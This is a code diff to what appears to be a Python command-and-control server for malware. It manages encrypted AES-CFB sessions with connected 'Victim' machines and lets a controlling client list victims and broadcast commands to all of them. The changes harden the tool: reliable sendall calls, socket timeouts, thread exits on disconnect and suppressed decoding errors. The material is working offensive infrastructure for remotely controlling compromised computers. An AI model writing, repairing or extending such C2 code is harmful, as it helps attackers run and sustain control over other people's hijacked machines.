@@ -9,7 +9,8 @@ from Crypto.Cipher import AES
 import base64
 import json
 import queue 
-
+import codecs
+codecs.register_error("strict", codecs.ignore_errors)
 
 print = functools.partial(print, flush=True)
 
@@ -46,6 +47,7 @@ class Victim(Thread):
         if(self.conn.send(b"\x01") != 1):
             print("An error has occured in Syncronization");
             sys.exit(-1)
+        self.conn.settimeout(5)
     
     def applyOTP(self,OTP, KEY):
         return bytes(o ^ k for o, k in zip(OTP, KEY))
@@ -56,35 +58,34 @@ class Victim(Thread):
             # Synchronize Buffer
             self.conn.recv(1)
             sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
-            self.conn.send((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
+            self.conn.sendall((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
             # Synchronize buffer
             self.conn.recv(1)
             ciphertext = sessionCipher.encrypt(buf);
             # send the cipher text back to the client
             # the session IV has allready been updated in this instance.
-            self.conn.send(ciphertext)
+            self.conn.sendall(ciphertext)
             self.SessionIV = self.conn.recv(16)
-        except:
+        except Exception as msg:
             print("C2 Server> Victim" + self.get_name() + "Disconnected! ")
             threadList.remove(self)
+            sys.exit()
 
     def secure_recv(self,):
         try:
             sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
             msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
-            if(self.conn.send(b"\x01") != 1):
-                print("An error has occured in Syncronization")
-                sys.exit(-1)
+            self.conn.sendall(b"\x01")
             MSG = self.conn.recv(msgSZ)
-            if(self.conn.send(b"\x01") != 1):
-                print("An error has occured in Syncronization")
-                sys.exit(-1)
+            self.conn.sendall(b"\x01")
             plaintext = sessionCipher.decrypt(MSG[16:])
             self.SessionIV = MSG[:16]
+            print(str(self.name))
             return plaintext;
-        except:
+        except Exception as msg:
             print("C2 Server> Victim " + self.get_name() + " Disconnected! ")
             threadList.remove(self)
+            sys.exit()
 
     def get_name(self):
         return str(self.conn.getpeername()) 
@@ -151,12 +152,15 @@ class CTRLClient(Thread):
                     command = json.loads(self.recvStr())
                     if command["Target"] == str(self.conn.getsockname()):
                         if str(command["Command"]) == "List Connections":
+                            jsonArray=[]
                             for t in threadList:
                                 jsonArray.append(t.get_name())
                             response = {}
                             response["Type"] = "Victim List"
                             response["Message"] = jsonArray
                             self.sendStr(json.dumps(response))
+                        else:
+                            continue
                     elif command["Target"] == "*":
                         for t in threadList:
                             t.addCommandToQueue(str(command["Command"]))
